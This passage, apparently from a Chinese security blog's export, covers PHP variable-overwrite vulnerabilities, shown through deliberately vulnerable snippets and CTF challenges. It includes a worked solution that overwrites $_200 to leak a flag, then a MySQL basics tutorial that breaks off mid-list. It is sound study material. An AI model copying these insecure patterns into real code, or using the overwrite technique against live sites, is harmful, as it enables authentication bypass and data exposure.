<li><a href="http://webcache.googleusercontent.com/search?q=cache:ByNQx_FhAlEJ:chybeta.github.io/2017/10/08/php%25E6%2596%2587%25E4%25BB%25B6%25E5%258C%2585%25E5%2590%25AB%25E6%25BC%258F%25E6%25B4%259E/+&amp;cd=8&amp;hl=en&amp;ct=clnk&amp;gl=de">PHP文件包含</a></li>
<li>[<a href="https://www.cnblogs.com/LittleHann/p/3665062.html">LFI、RFI、PHP封装协议安全问题学习</a></li>
<li><a href="https://smelond.com/2018/09/04/LFI%E4%BB%A5%E5%8F%8ARF(%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB)%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8%E5%B0%8F%E6%8A%80%E5%B7%A7/">LFI以及RFI(文件包含)伪协议利用小技巧</a></li>
<li><a href="https://github.com/SewellDinG/LFIboomCTF">LFIBoomCTF</a></li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之变量覆盖漏洞利用</title>
    <url>/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Web安全学习之变量覆盖漏洞利用">Web安全学习之变量覆盖漏洞利用</h1>
<p>这一篇主要通过几道CTF题讲解一下PHP变量覆盖漏洞利用，主要涉及到extract()函数，parse_str()函数，import_request_variables()函数，$$运算符。</p>
<h2 id="全局变量覆盖">全局变量覆盖</h2>
<blockquote>
<p>PHP 5.3.0被废弃，PHP5.4.0被移除</p>
</blockquote>
<p>PHP中使用变量并不需要初始化，因此register_globals=On时，变量来源可能是各个不同的地方，比如页面的表单、Cookie等。例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Register_gl`obals: &quot;</span> . (<span class="keyword">int</span>)ini_get(<span class="string">&quot;register_globals&quot;</span>) . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ($auth) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;private&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>当register_globals=Off时，这段代码不会有问题：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118084207.png" alt=""></p>
<p>但是当register_globals=On时，提交<code>http://localhost/variableCover/index.php/?auth=1</code>，变量<code>$auth</code>会自动得到赋值：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118084337.png" alt=""></p>
<p>如果在代码中已经初始化了$auth变量，也不会有变量覆盖漏洞。</p>
<p>另外通过$GLOBALS获取的变量，也可能导致变量覆盖。</p>
<h2 id="extract-变量覆盖">extract()变量覆盖</h2>
<p>extract()函数从数组中将变量导入到当前符号表。该函数使用数组键名作为变量名，数组键值作为变量值。针对数组中每一个元素，将在当前符号表中创建对应的一个变量。</p>
<p>函数定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int extract ( array $var_array [, int $extract_type [, string $prefix ]] )</span><br></pre></td></tr></table></figure>
<p>其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是EXTR_OVERWRITE和EXTR_SKIP。</p>
<p>当值为EXTR_OVERWRITE时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为EXTR_SKIP则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用EXTR_OVERWRITE。</p>
<p>当extract()函数从用户可以控制的数组中导出变量且第二个参数未设置或设置为EXTR_OVERWRITE时，就存在变量覆盖漏洞，例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$auth = <span class="number">1</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($auth == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;private&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;public&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在这个例子里，extract()从$_GET中导出变量，从而可以导致任意变量被覆盖，即：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118144039.png" alt=""></p>
<h2 id="parse-str-变量覆盖">parse_str()变量覆盖</h2>
<p>函数定义：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> parse_str (<span class="keyword">string</span> $str [, <span class="keyword">array</span> $arr])</span><br></pre></td></tr></table></figure>
<p>当parse_str()函数的参数值可以被用户控制时，则存在变量覆盖漏洞：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a = <span class="string">&#x27;init&#x27;</span>;</span><br><span class="line">parse_str($SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118145544.png" alt=""></p>
<p>再来看一道CTF的题目：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">	show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">include</span> (<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">	$a = <span class="string">&quot;www.ca0y1h.top&quot;</span>;</span><br><span class="line">	$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">	@parse_str($id);</span><br><span class="line">	<span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">&#x27;QNKCDZO&#x27;</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">&#x27;so easy!&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>也就是PHP弱类型和变量覆盖结合的题目：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118151825.png" alt=""></p>
<h2 id="mb-parse-str-变量覆盖">mb_parse_str()变量覆盖</h2>
<p>mb_parse_str()函数用于解析GET/POST/COOKIE数据并设置全局变量，和parse_str()类似。</p>
<h2 id="import-request-variables-变量覆盖">import_request_variables()变量覆盖</h2>
<blockquote>
<p>支持版本：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p>
</blockquote>
<p>import_request_variables()函数将GET、POST、Cookies中的变量导入到全局。</p>
<p>函数定义如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> import_request_variables (<span class="keyword">string</span> $types [, <span class="keyword">string</span> $prefix])</span><br></pre></td></tr></table></figure>
<p><code>$type</code>代表要注册的变量，G代表GET，P代表POST，C代表COOKIE，第二个参数为要注册变量的前缀，如果没有指定，则将覆盖全局变量。例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$auth = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">import_request_variables(<span class="string">&#x27;P&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($auth === <span class="string">&#x27;0&#x27;</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;private&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;public&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118150713.png" alt=""></p>
<h2 id="导致的变量覆盖"><code>$$</code>导致的变量覆盖</h2>
<p><code>$$</code>即可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。例如：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">	$x = <span class="string">&quot;ca01h&quot;</span>;</span><br><span class="line">	$$x = <span class="number">666</span>;</span><br><span class="line">	<span class="keyword">echo</span> $x.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $$x.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> $ca01h;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>其实也就等价于<code>$($x)</code>，输出为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca01h</span><br><span class="line">666</span><br><span class="line">666</span><br></pre></td></tr></table></figure>
<p><code>$$</code>导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，如以下的示例代码，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> $_request)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value)  </span><br><span class="line">    &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">isset</span>($id) ? $id : <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($id === <span class="string">&quot;ca01h&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;flag&#123;xxxxxxxxxx&#125;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Nothing...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里以GET、POST或COOKIE都能触发变量覆盖漏洞，传入id=ca01h后，在foreach语句中，<code>$_key</code>为id，<code>$_value</code>为ca01h，进而<code>$$_key</code>为$id，从而实现了变量覆盖。</p>
<p>最后以一道CTF题为此文章结尾：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">$_403 = <span class="string">&quot;Access Denied&quot;</span>;</span><br><span class="line">$_200 = <span class="string">&quot;Welcome Admin&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&quot;REQUEST_METHOD&quot;</span>] != <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;BugsBunnyCTF is here :p…&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>($_POST[<span class="string">&quot;flag&quot;</span>]) )&#123;</span><br><span class="line">	<span class="keyword">die</span>($_403);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">	$$key = $$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">	$$key = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_POST[<span class="string">&quot;flag&quot;</span>] !== $flag )	&#123;</span><br><span class="line">	<span class="keyword">die</span>($_403);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;This is your flag : &quot;</span>. $flag . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	<span class="keyword">die</span>($_200);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到，有3个if语句和2个foreach语句。</p>
<p>在if语句中，第一个需要你是通过POST方式进行请求，第二个是需要POST一个flag参数过去，第三个是比较flag参数和包含进来的真正的flag是否相等。</p>
<p>在foreach语句中，第一个是可以将GET的参数进行变量覆盖，第二个是将POST的参数进行变量覆盖，但两个语句的处理是有点区别的即一个键值为$$value另一个为$value。</p>
<p>这里整理一下思路：</p>
<ol>
<li>因为POST的参数必须为flag，则第二个foreach语句的<code>$key</code>为flag，进而<code>$$key</code>为<code>$flag</code>，从而得到<code>$flag</code>的值为POST传递的flag参数的值。</li>
<li>又因为第二个foreach语句修改了<code>$flag</code>原来的值为POST传递的flag参数的值，因而最后一个if语句的条件是恒不成立的，在其后的else代码块逻辑中echo输出出来的只能是修改了的<code>$flag</code>的值即POST传递的flag参数的值而非原本的<code>$flag</code>的值、接着输出<code>$_200</code>变量的值。</li>
<li>要想输出原本的<code>$flag</code>的值，我们需要将原本的<code>$flag</code>覆盖<code>$_200</code>变量，因此在第一个<code>foreach</code>语句中通过GET输入<code>_200=flag</code>，从而得到的<code>$$key</code>为<code>$_200</code> 以及<code>$$value</code>为<code>$flag</code>，从而实现在修改<code>$flag</code>的值之前将其覆盖到<code>$_200</code>变量中。</li>
</ol>
<p>验证结果：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191118161214.png" alt=""></p>
<h2 id="Reference">Reference</h2>
<ul>
<li>《白帽子讲Web安全》</li>
<li><a href="https://www.mi1k7ea.com/2019/06/20/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">PHP变量覆盖漏洞小小结——mi1k7ea</a></li>
<li><a href="https://y4er.com/post/variable-coverage/">PHP变量覆盖总结——Y4er</a></li>
<li><a href="https://p0sec.net/index.php/archives/35/">PHP变量覆盖总结——p0sec</a></li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web安全基础</tag>
        <tag>变量覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全学习之MySQL基本操作</title>
    <url>/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h1 id="Web安全学习之MySQL基本操作">Web安全学习之MySQL基本操作</h1>
<blockquote>
<p>主要以《MySQL必知必会》（《MySQl Crash Course》）为参考</p>
</blockquote>
<h2 id="任务目标">任务目标</h2>
<ul>
<li>什么是关系型和⾮关系型数据库</li>
<li>选择⼀种关系型数据库进⾏学习</li>
<li>学习数据库中的字段类型并创建库和⽤⼾表，需要包含所有字段类型</li>
<li>学习数据库的增删改查，记录学习过程</li>
</ul>
<a id="more"></a>
<h2 id="0x01-SQL-NoSQL">0x01 SQL&amp;NoSQL</h2>
<ol>
<li>
<h5 id="关系型数据库">关系型数据库</h5>
<ul>
<li>关系型数据库是以关系模型来创建的数据库。</li>
<li>关系模型就是指二维表格模型。</li>
<li>一个关系型数据库就是由二维表及其之间的联系组成的一个数据组织。</li>
<li>常见的关系型数据库有：<br>
Mysql、Oracle、PostgreSQL、SQLServer、MicrosoftAccess</li>
</ul>
</li>
<li>
<h5 id="非关系型数据库">非关系型数据库</h5>
<ul>
<li>非关系型数据库是以非关系模型来创建的数据库。</li>
<li>非关系模型有列模型、键值对模型、文档类模型。</li>
<li>常见的关系型数据库有：<br>
MongoDB、Redis、MemcacheDB、HBase</li>
</ul>
</li>
</ol>
<h2 id="0x02-数据类型">0x02 数据类型</h2>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">类型</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">INT</td>
<td style="text-align:left">整型</td>
<td style="text-align:left">4字节整数类型，范围约+/-21亿</td>
</tr>
<tr>
<td style="text-align:left">BIGINT</td>
<td style="text-align:left">长整型</td>
<td style="text-align:left">8字节整数类型，范围约+/-922亿亿</td>
</tr>
<tr>
<td style="text-align:left">REAL</td>
<td style="text-align:left">浮点型</td>
<td style="text-align:left">4字节浮点数，范围约+/-1038</td>
</tr>
<tr>
<td style="text-align:left">DOUBLE</td>
<td style="text-align:left">浮点型</td>
<td style="text-align:left">8字节浮点数，范围约+/-10308</td>
</tr>
<tr>
<td style="text-align:left">DECIMAL(M,N)</td>
<td style="text-align:left">高精度小数</td>
<td style="text-align:left">由用户指定精度的小数，例如，DECIMAL(20,10)表示一共20位，其中小数10位，通常用于财务计算</td>
</tr>
<tr>
<td style="text-align:left">CHAR(N)</td>
<td style="text-align:left">定长字符串</td>
<td style="text-align:left">存储指定长度的字符串，例如，CHAR(100)总是存储100个字符的字符串</td>
</tr>
<tr>
<td style="text-align:left">VARCHAR(N)</td>
<td style="text-align:left">变长字符串</td>
<td style="text-align:left">存储可变长度的字符串，例如，VARCHAR(100)可以存储0~100个字符的字符串</td>
</tr>
<tr>
<td style="text-align:left">BOOLEAN</td>
<td style="text-align:left">布尔类型</td>
<td style="text-align:left">存储True或者False</td>
</tr>
<tr>
<td style="text-align:left">DATE</td>
<td style="text-align:left">日期类型</td>
<td style="text-align:left">存储日期，例如，2018-06-22</td>
</tr>
<tr>
<td style="text-align:left">TIME</td>
<td style="text-align:left">时间类型</td>
<td style="text-align:left">存储时间，例如，12:20:59</td>
</tr>
<tr>
<td style="text-align:left">DATETIME</td>
<td style="text-align:left">日期和时间类型</td>
<td style="text-align:left">存储日期+时间，例如，2018-06-22 12:20:59</td>
</tr>
</tbody>
</table>
<h2 id="0x03-样例表设计">0x03 样例表设计</h2>
<ul>
<li>
<p>vendors表</p>
<p>vendors表存储销售产品的供应商。每个供应商在这个表中有一个记录，供应商ID（vend_id）列用来匹配产品和供应商。</p>
<table>
<thead>
<tr>
<th style="text-align:center">列</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">vend_id</td>
<td style="text-align:center">供应商ID</td>
</tr>
<tr>
<td style="text-align:center">vend_name</td>
<td style="text-align:center">供应商名</td>
</tr>
<tr>
<td style="text-align:center">vend_address</td>
<td style="text-align:center">供应商的地址</td>
</tr>
<tr>
<td style="text-align:center">vend_city</td>
<td style="text-align:center">供应商的城市</td>
</tr>
<tr>
<td style="text-align:center">vend_state</td>
<td style="text-align:center">供应商的州</td>
</tr>
<tr>
<td style="text-align:center">vend_zip</td>
<td style="text-align:center">供应商的邮政编码</td>
</tr>
<tr>
<td style="text-align:center">vend_country</td>
<td style="text-align:center">供应商的国家</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>products表</p>
<p>products表包含产品目录，每行一个产品。每个产品有唯一的ID（prod_id列），通过vend_id（供应商的唯一ID）关联到它的供应商。</p>
<table>
<thead>
<tr>
<th style="text-align:center">列</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">prod_id</td>
<td style="text-align:center">产品ID</td>
</tr>
<tr>
<td style="text-align:center">vend_id</td>
<td style="text-align:center">产品供应商ID</td>
</tr>
<tr>
<td style="text-align:center">prod_name</td>
<td style="text-align:center">产品名</td>
</tr>
<tr>
<td style="text-align:center">prod_price</td>
<td style="text-align:center">产品价格</td>
</tr>
<tr>
<td style="text-align:center">prod_desc</td>
<td style="text-align:center">产品描述</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>customers表</p>
<p>customers表存储所有顾客的信息。每个顾客有唯一的ID（cust_id列）。</p>
<table>
<thead>
<tr>
<th style="text-align:center">列</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">cust_id</td>
<td style="text-align:center">顾客ID</td>
</tr>
<tr>
<td style="text-align:center">cust_name</td>
<td style="text-align:center">顾客姓名</td>
</tr>
<tr>
<td style="text-align:center">cust_address</td>
<td style="text-align:center">顾客的地址</td>
</tr>
<tr>
<td style="text-align:center">cust_city</td>
<td style="text-align:center">顾客的城市</td>
</tr>
<tr>
<td style="text-align:center">cust_state</td>
<td style="text-align:center">顾客的州</td>
</tr>
<tr>
<td style="text-align:center">cust_zip</td>
<td style="text-align:center">顾客的邮政编码</td>
</tr>
<tr>
<td style="text-align:center">cust_country</td>
<td style="text-align:center">顾客的国家</td>
</tr>
<tr>
<td style="text-align:center">cust_contact</td>
<td style="text-align:center">顾客的联系方式</td>
</tr>
<tr>
<td style="text-align:center">cust_email</td>
<td style="text-align:center">顾客的邮箱</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>orders表</p>
<p>orders表存储顾客订单（但不是订单细节）。每个订单唯一地编号（order_num列）。订单用cust_id列（它关联到customer表的顾客唯一ID）与相应的顾客关联。</p>
<table>
<thead>
<tr>
<th style="text-align:center">列</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">order_num</td>
<td style="text-align:center">唯一订单号</td>
</tr>
<tr>
<td style="text-align:center">order_date</td>
<td style="text-align:center">订单日期</td>
</tr>
<tr>
<td style="text-align:center">cust_id</td>
<td style="text-align:center">订单顾客ID</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>orderitems表</p>
<p>orderitems表存储每个订单中的实际物品，每个订单的每个物品占一行。对orders中的每一行，orderitems中有一行或多行。每个订单物品由订单号加订单物品（第一个物品、第二个物品等）唯一标识。订单物品通过order_num列（关联到orders中订单的唯一ID）与它们相应的订单相关联。此外，每个订单项包含订单物品的产品ID（它关联物品到products表）</p>
<table>
<thead>
<tr>
<th style="text-align:center">列</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">order_num</td>
<td style="text-align:center">订单号（关联到orders表的order_num）</td>
</tr>
<tr>
<td style="text-align:center">order_item</td>
<td style="text-align:center">订单物品号（在某个订单中的顺序）</td>
</tr>
<tr>
<td style="text-align:center">prod_id</td>
<td style="text-align:center">产品ID（关联到products表的prod_id）</td>
</tr>
<tr>
<td style="text-align:center">quantity</td>
<td style="text-align:center">物品数量</td>
</tr>
<tr>
<td style="text-align:center">item_price</td>
<td style="text-align:center">物品价格</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>productnotes表</p>
<p>productnotes表存储与特定产品有关的注释。并非所有产品都有相关的注释，而有的产品可能有许多相关的注释。</p>
<table>
<thead>
<tr>
<th style="text-align:center">列</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">note_id</td>
<td style="text-align:center">注释ID</td>
</tr>
<tr>
<td style="text-align:center">prod_id</td>
<td style="text-align:center">产品ID</td>
</tr>
<tr>
<td style="text-align:center">note_date</td>
<td style="text-align:center">增加注释的日期</td>
</tr>
<tr>
<td style="text-align:center">note_text</td>
<td style="text-align:center">注释的内容</td>
</tr>
</tbody>
</table>
</li>
</ul>
<h2 id="0x04-样例表创建">0x04 样例表创建</h2>
<p>附件中包含两个可以执行的SQL脚本文件。</p>
<ul>
<li>create.sql包含创建6个数据库表（包括所有主键和外键约束）的MySQL语句。</li>
<li>populate.sql包含用来填充这些表的INSERT语句。</li>
</ul>
<p>然后按照以下步骤创建样例表</p>
<ul>
<li>创建一个新的数据库</li>
<li>选择新数据源（如果使用mysql命令行实用程序，用USE命令）</li>
<li>执行create.sql脚本和populate.sql脚本。如果使用mysql命令行实用程序，可给出<br>
source create.sql;（指定create.sql文件的完全路径）</li>
</ul>
<h2 id="0x05-简单检索数据">0x05 简单检索数据</h2>
<ul>
<li>单个列：<code>SELECT prod_name FROM products;</code></li>
<li>多个列：<code>SELECT pro_id, prod_name, prod_price FROM products;</code></li>
<li>所有列：<code>SELECT * FROM products;</code></li>
<li>不同值的行：<code>SELECT DISTINCT vend_id FROM products;</code></li>
<li>指定某一区间的行：<code>SELECT prod_name FROM products LIMIT 5 OFFSET 5;</code></li>
</ul>
<h2 id="0x06-排序检索数据">0x06 排序检索数据</h2>
<ul>
<li>
<p>按单列排序数据：<code>SELECT prod_name FROM products ORDER_BY prod_name;</code></p>
</li>
<li>
<p>按多列排序数据：<code>SELECT prod_id, prod_price, prod_name FROM products ORDER BY prod_price DESC, prod_name;</code></p>
<blockquote>
<p>指定prod_price降序排列，prod_name升序排列。</p>
</blockquote>
</li>
<li>
<p>求最大值或最小值：<code>SELECT prod_price FROM products ORDER BY prod_price DESC limit 1;</code></p>
</li>
</ul>
<h2 id="0x07-过滤数据">0x07 过滤数据</h2>
<blockquote>
<p>（ORDER BY子句位于WHERE子句后面）</p>
</blockquote>
<p><strong>操作符类型：=, &lt;&gt;, &lt;, &lt;=, &gt;, &gt;=, BETWEEN, IS NULL, AND, OR</strong><br>
其中AND操作符的优先级大于OR操作符，例如：<code>SELECT prod_name, prod_price FROM products WHERE vend_id = 1002 OR vend_id = 1003 AND prod_price &gt;= 10;</code> 其结果为：<br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-4a14e3ec1b92320b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>
IN操作符：<code>SELECT prod_name, prod_price FROM products WHERE vend_id IN (1002, 1003);</code><br>
IN操作符与OR操作符的作用相当，但是IN操作符有以下几点优势：</p>
<ul>
<li>IN操作符的语法更直观简洁；</li>
<li>IN操作符一般比OR操作符执行更快；</li>
<li>IN操作符最大优点是可以包含其他SELECT语句，使得能够更动态的创建WHERE子句。</li>
</ul>
<h2 id="0x08-通配符">0x08 通配符</h2>
<ol>
<li>百分号（<code>%</code>）通配符：<code>SELECT prod_id, prod_name FROM  products WHERE prod_name LIKE '%anvil%';</code><br>
注意：<code>%</code>通配符无法匹配NULL；<code>%</code>通配符还能匹配0个字符。</li>
<li>下划线（<code>_</code>）通配符：用途跟<code>%</code>通配符一样，但是<code>_</code>通配符只能匹配单个字符。</li>
</ol>
<h2 id="0x09-创建计算字段">0x09 创建计算字段</h2>
<ol>
<li>
<p>拼接字段（Concat()函数）：<code>SELECT Concat(vend_name, '(' , vend_country, ')') FROM vendors ORDER BY vend_name;</code><br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-a26d319331b89656.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
<p>Trim()函数：删除数据两侧多余的空格来整理数据<br>
<code>SELECT Concat(RTrim(vend_name), '(', RTrim(vend_country), ')' ) FROM vendors ORDER BY vend_name;</code></p>
</li>
<li>
<p>使用别名：<code>SELECT Concat(vend_name, '(' , vend_country, ')') AS vendor_title FROM vendors ORDER BY vend_name;</code><br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-77e6a3849355621f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
</li>
<li>
<p>算术计算：<code>SELECT prod_id, quantity, item_price, quantity*item_price AS expanded_price FROM orderitems WHERE order_num = 20005;</code><br>
<img src="https://upload-images.jianshu.io/upload_images/11397602-e73be3ae2f0472d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
</li>
</ol>
<h2 id="0x0A-汇总数据">0x0A 汇总数据</h2>
<ol>
<li>
<p>五种聚集函数：</p>
<ul>
<li>AVG():返回某列的平均值<br>
<code>SELECT  AVG(prod_price) AS avg_price FROM products WHERE vend_id = 1003;</code></li>
<li>COUNT():返回某列的行数<br>
用法1：COUNT(*)对表中行的数目进行计数，不管表列中包含的是空值（NULL）还是非空值；<br>
<code>SELECT COUNT(*) AS num_cust FROM customers;</code><br>
用法2：COUNT(column)对特定列中具有值的行进行计数，忽略NULL值。<br>
`SELECT COUNT(cust_email) AS num_cust FROM customers;</li>
<li>MAX():返回<strong>指定列</strong>中的最大值（忽略值为NULL的行）<br>
<code>SELECT MAX(prod_price) AS max_price FROM products;</code></li>
<li>MIN():返回<strong>指定列</strong>中的最小值（忽略值为NULL的行）<br>
<code>SELECT MIN(prod_price) AS mIin_price FROM products;</code></li>
<li>SUM():返回<strong>指定列</strong>值的和<br>
<code>SELECT SUM(quantity*item_price) AS total_price FROM orderitems WHERE order_num = 20005;</code></li>
</ul>
</li>
<li>
<p>聚集不同值<br>
以上的五个聚集函数都可以如下使用：</p>
<ul>
<li>对所有行执行计算指定ALL参数或不给参数（ALL是默认行为）</li>
<li>只包含不同的值，指定DISTINCT参数<br>
<code>SELECT AVG(DISTINCT prod_price) AS avg_price FROM products WHERE vend_id = 1003;</code></li>
</ul>
</li>
<li>
<p>组合聚集函数</p>
